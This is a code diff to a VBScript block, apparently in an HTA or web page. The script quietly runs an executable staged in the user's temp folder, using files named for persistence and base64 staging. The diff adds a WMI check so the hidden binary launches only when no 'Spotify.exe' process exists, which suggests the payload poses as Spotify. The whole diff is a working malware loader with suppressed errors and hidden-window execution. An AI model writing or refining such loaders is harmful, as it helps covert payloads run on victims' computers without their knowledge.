@@ -2,9 +2,10 @@
 <script language="VBScript">
 On Error Resume Next
 
-Dim objShell, objFSO
+Dim objShell, objFSO, objWMIService
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 
 Dim tempDir
 tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
@@ -17,7 +18,13 @@ b64File = tempDir & "\persist_b64.tmp"
 
 If objFSO.FileExists(peFile) Then
     If objFSO.GetFile(peFile).Size > 0 Then
-        objShell.Run """" & peFile & """", 0, False
+        If Not objWMIService Is Nothing Then
+            Dim colProc
+            Set colProc = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'Spotify.exe'")
+            If colProc.Count = 0 Then
+                objShell.Run """" & peFile & """", 0, False
+            End If
+        End If
         WScript.Quit
     End If
 End If
@@ -27,9 +34,7 @@ Dim lockStream
 Set lockStream = objFSO.CreateTextFile(lockFile, True)
 lockStream.Close
 
-Dim objWMIService
-Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-If Err.Number <> 0 Then
+If objWMIService Is Nothing Then
     objFSO.DeleteFile lockFile, True
     WScript.Quit
 End If
